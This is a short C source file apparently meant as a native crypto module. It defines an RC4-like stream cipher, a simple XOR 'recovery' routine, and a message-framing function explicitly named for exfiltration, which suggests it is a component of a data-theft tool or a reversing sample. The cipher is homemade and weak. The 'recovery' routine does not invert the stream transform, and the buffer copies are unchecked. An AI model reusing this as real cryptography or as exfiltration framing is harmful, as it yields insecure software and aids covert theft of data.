/* crypto_engine.c - Native cryptographic operations module */

#include <stdint.h>
#include <string.h>

/* ---- Stream engine ---- */

typedef struct {
    uint8_t st[256];
    uint8_t tw[16];
    int tl;
    uint32_t gp;
} se_ctx;

void se_init(se_ctx *c, const uint8_t *k, int kl, const uint8_t *t, int tl) {
    int i;
    uint8_t j = 0, tmp;
    for (i = 0; i < 256; i++) c->st[i] = (uint8_t)i;
    for (i = 0; i < 256; i++) {
        j = j + c->st[i] + k[i % kl];
        tmp = c->st[i];
        c->st[i] = c->st[j];
        c->st[j] = tmp;
    }
    if (tl > 16) tl = 16;
    memcpy(c->tw, t, tl);
    c->tl = tl;
    c->gp = 0;
}

static void _rf(se_ctx *c, const uint8_t *d, int n) {
    int i;
    uint8_t j = 0, tmp;
    for (i = 0; i < 256; i++) {
        j = j + c->st[i] + d[i % n];
        tmp = c->st[i];
        c->st[i] = c->st[j];
        c->st[j] = tmp;
    }
}

int se_transform(se_ctx *c, const uint8_t *in, uint8_t *out, int len) {
    int i;
    for (i = 0; i < len; i++) {
        uint32_t g = c->gp + (uint32_t)i;
        uint8_t s = c->st[in[i]];
        uint8_t tv = c->tw[g % c->tl];
        uint8_t pv = (uint8_t)(((g + 1) * 0x9E3779B9u) & 0xFFu);
        out[i] = s ^ tv ^ pv;
        if (((g + 1) & 0xFF) == 0) {
            int fs = (i + 1 > 16) ? (i + 1 - 16) : 0;
            _rf(c, &out[fs], (i + 1) - fs);
        }
    }
    c->gp += (uint32_t)len;
    return len;
}

/* ---- Recovery engine ---- */

typedef struct {
    uint8_t ks[32];
    int kl;
} re_ctx;

void re_init(re_ctx *c, const uint8_t *e, int el, const uint8_t *iv, int il) {
    int i;
    memset(c->ks, 0, 32);
    c->kl = 16;
    for (i = 0; i < el; i++) c->ks[i % 16] ^= e[i];
    for (i = 0; i < il; i++) c->ks[i % 16] ^= iv[i];
}

int re_transform(re_ctx *c, const uint8_t *in, uint8_t *out, int len) {
    int i;
    for (i = 0; i < len; i++)
        out[i] = in[i] ^ c->ks[i % c->kl];
    return len;
}

/* ---- Transport framing ---- */

int pack_exfil_msg(uint32_t seq, const uint8_t *data, int dlen, uint8_t *out) {
    out[0] = 0xC0; out[1] = 0xDE; out[2] = 0x00; out[3] = 0x01;
    out[4] = (seq >> 24) & 0xFF;
    out[5] = (seq >> 16) & 0xFF;
    out[6] = (seq >> 8) & 0xFF;
    out[7] = seq & 0xFF;
    memcpy(&out[8], data, dlen);
    return 8 + dlen;
}
